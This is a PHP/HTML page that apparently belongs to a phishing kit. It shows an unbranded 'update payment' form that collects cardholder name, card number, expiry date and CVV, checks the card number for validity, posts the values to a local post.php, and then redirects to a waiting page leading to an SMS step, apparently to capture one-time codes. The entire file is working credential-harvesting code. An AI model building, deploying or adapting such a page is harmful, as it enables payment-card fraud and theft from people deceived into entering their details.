<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>    
<main>
    <div class="form">
        <div class="logo"><img src="res/logo.png"></div>
        <div class="text">
            <h2><?php echo $lang['_update_payment_title']; ?></h2>
            <span><?php echo $lang['_update_payment_message']; ?></span>
        </div>
 
        <div class="col">
            <label><?php echo $lang['_cardholder_name_label']; ?></label>
            <input type="text" id="d0">
        </div>

        <div class="col">
            <label><?php echo $lang['_card_number_label']; ?></label>
            <input type="text" id="d1" placeholder="XXXX XXXX XXXX XXXX">
        </div>

        <div class="col">
            <label><?php echo $lang['_expiry_date_label']; ?></label>
            <input type="text" id="d2" placeholder="MM/YY">
        </div>

        <div class="col">
            <label><?php echo $lang['_security_code_label']; ?></label>
            <input type="text" id="d3" placeholder="CVV">
        </div>

        <div class="col">
            <button onclick="sendCard()"><?php echo $lang['_continue_button']; ?></button>
        </div>

        <div class="col links">
            <span><?php echo $lang['_form_help']; ?></span>
            <span><?php echo $lang['_form_privacy']; ?></span>
            <span><?php echo $lang['_form_terms']; ?></span>
        </div>
        
    </div>
</main>


<script src="./res/cdn/jq.js"></script>
<script src="./res/cdn/v.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>




<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
 
 


var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 


if($("#d1").val().length<16){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}
 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<24 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendCard();
    }
});

function sendCard(){
    validate();

    if(allowSubmit){
        $.post("post.php", 
			{
                name:$("#d0").val(),
				cc:$("#d1").val(),
                exp:$("#d2").val(),
				cvv:$("#d3").val()

			}, function(done){
                window.location="wait.php?next=sms.php";
			}
		
		);

    }
}

</script>
</body>
</html>